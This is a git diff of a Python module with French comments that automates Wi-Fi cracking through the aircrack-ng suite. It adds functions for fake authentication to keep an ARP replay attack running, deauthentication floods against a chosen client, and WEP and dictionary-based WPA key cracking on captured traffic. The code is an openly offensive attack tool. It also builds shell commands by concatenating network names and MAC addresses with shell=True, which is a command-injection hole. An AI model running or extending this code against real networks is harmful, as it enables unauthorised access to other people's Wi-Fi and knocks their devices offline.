@@ -53,6 +53,17 @@ def network_listening(registered_network):
 	return pro.pid
 
 """
+    lance une authentification pour garder un lien et exécuter une attaque arp
+"""
+def keep_alive_packet(box):
+    BSSID = box._BSSID
+    ESSID = box._ESSID
+    cmd = "aireplay-ng -1 6000 -o 1 -q 10 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one"
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
+
+"""
 	Lancement de l'attaque arp
 	registered_network: box que l'on attaque
 	/!\ tous les chemins sont en relatifs !!
@@ -67,6 +78,16 @@ def arp_attack(registered_network):
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
 	return pro.pid
+
+def deau_attack_final(box, client):
+    BSSID = box._BSSID
+    mac_client = client._MAC_CLIENT
+    cmd = "aireplay-ng -0 10 -a " + BSSID + " -c " + mac_client + " mon0 --ignore-negative-one"
+
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
+
 
 """
     deauthentification pour capturer plus de trucs
@@ -84,11 +105,18 @@ def deau_attack(BSSID, mac_client):
 	datafile_path : dossiers dans lesquels sont les .cap/.iv
 """
 def aircrack_final_wep(datafile_path):
-	cmd = "aircrack-ng " + datafile_path + "/*<.cap/.iv>";
+	cmd = "aircrack-ng " + datafile_path + "/*.cap"
 
 	FNULL = open(os.devnull, 'w')
 	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
 	return pro.pid
+
+def aircrack_final_wpa(datafile_path):
+    cmd = "aircrack-ng -w dictionnaire/* " + datafile_path + "/*.cap"
+
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
 
 def deauthentification_attack(box, client):
     BSSID = box._BSSID
